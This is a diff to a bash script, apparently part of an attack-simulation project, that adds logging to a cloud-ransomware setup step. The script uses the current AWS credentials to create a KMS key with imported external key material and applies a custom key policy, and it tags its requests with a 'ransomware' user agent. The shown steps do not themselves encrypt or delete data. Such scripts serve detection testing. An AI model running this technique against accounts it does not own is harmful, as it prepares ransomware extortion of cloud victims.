@@ -1,30 +1,45 @@
 #!/bin/bash
 
+LOGFILE=/tmp/attacker_compromised_credentials_cloud_ransomware.sh.log
+function log {
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
+    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
+}
+truncate -s 0 $LOGFILE
+
+log "Setting User-agent: AWS_EXECUTION_ENV=ransomware"
+export AWS_EXECUTION_ENV="ransomware"
+
 # install preqs
-if which yum; then
-yum install -y jq openssl
-elif which apt; then
-apt-get install -y jq openssl
-else
-echo "Unsupported release - missing apt or yum"
-exit 1
-fi
+yum install -y jq openssl >> $LOGFILE 2>&1
 
 # aws account where kms key will be created
 AWS_ACCOUNT_ID=$(aws sts get-caller-identity | jq '.Account' --raw-output)
 # aws current user arn
 AWS_CURRENT_USER=$(aws sts get-caller-identity | jq '.Arn' --raw-output)
 
+log "AWS_ACCOUNT_ID: $AWS_ACCOUNT_ID"
+log "AWS_CURRENT_USER: $AWS_CURRENT_USER"
+
+log "Removing key_material directory..."
+rm -rf ./key_material
+log "Creating key_material directory..."
 mkdir ./key_material
 
 KEY_ID=$(aws kms create-key --origin EXTERNAL | jq '.KeyMetadata.KeyId' --raw-output)
-openssl rand -out ./key_material/PlaintextKeyMaterial.bin 32
-openssl base64 -in ./key_material/PlaintextKeyMaterial.bin -out ./key_material/PlaintextKeyMaterial.b64
+log "KEY_ID: $KEY_ID"
+
+log "Generating key material..."
+openssl rand -out ./key_material/PlaintextKeyMaterial.bin 32 >> $LOGFILE 2>&1
+openssl base64 -in ./key_material/PlaintextKeyMaterial.bin -out ./key_material/PlaintextKeyMaterial.b64 >> $LOGFILE 2>&1
 KEY=$(aws kms --region us-east-1 get-parameters-for-import --key-id "$KEY_ID" --wrapping-algorithm RSAES_OAEP_SHA_256 --wrapping-key-spec RSA_2048 --query '{Key:PublicKey,Token:ImportToken}' --output text)
+log "KEY: $KEY"
 echo "$KEY" | awk '{print $1}' > ./key_material/PublicKey.b64
 echo "$KEY" | awk '{print $2}' > ./key_material/ImportToken.b64
-openssl enc -d -base64 -A -in ./key_material/PublicKey.b64 -out ./key_material/PublicKey.bin
-openssl enc -d -base64 -A -in ./key_material/ImportToken.b64 -out ./key_material/ImportToken.bin
+
+log "Decoding base64 key material..."
+openssl enc -d -base64 -A -in ./key_material/PublicKey.b64 -out ./key_material/PublicKey.bin >> $LOGFILE 2>&1
+openssl enc -d -base64 -A -in ./key_material/ImportToken.b64 -out ./key_material/ImportToken.bin >> $LOGFILE 2>&1
 openssl pkeyutl \
     -in ./key_material/PlaintextKeyMaterial.bin \
     -out ./key_material/EncryptedKeyMaterial.bin \
@@ -34,8 +49,9 @@ openssl pkeyutl \
     -encrypt \
     -pkeyopt \
     rsa_padding_mode:oaep \
-    -pkeyopt rsa_oaep_md:sha256
+    -pkeyopt rsa_oaep_md:sha256 >> $LOGFILE 2>&1
 
+log "Importing key material..."
 aws kms \
     --region us-east-1 \
     import-key-material \
@@ -43,7 +59,9 @@ aws kms \
     --encrypted-key-material \
     fileb://./key_material/EncryptedKeyMaterial.bin \
     --import-token fileb://./key_material/ImportToken.bin \
-    --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE
+    --expiration-model KEY_MATERIAL_DOES_NOT_EXPIRE >> $LOGFILE 2>&1
+
+log "Creating key policy..."
 cat <<EOF > ./key_material/new_key_policy.json
 {
     "Version": "2012-10-17",
@@ -102,9 +120,13 @@ cat <<EOF > ./key_material/new_key_policy.json
     ]
 }
 EOF
+cat ./key_material/new_key_policy.json >> $LOGFILE 2>&1
 
 # add key policy
+log "Adding key policy..."
 aws kms put-key-policy \
     --policy-name default \
     --key-id "$KEY_ID" \
-    --policy file://./key_material/new_key_policy.json
+    --policy file://./key_material/new_key_policy.json >> $LOGFILE 2>&1
+
+log "Done."
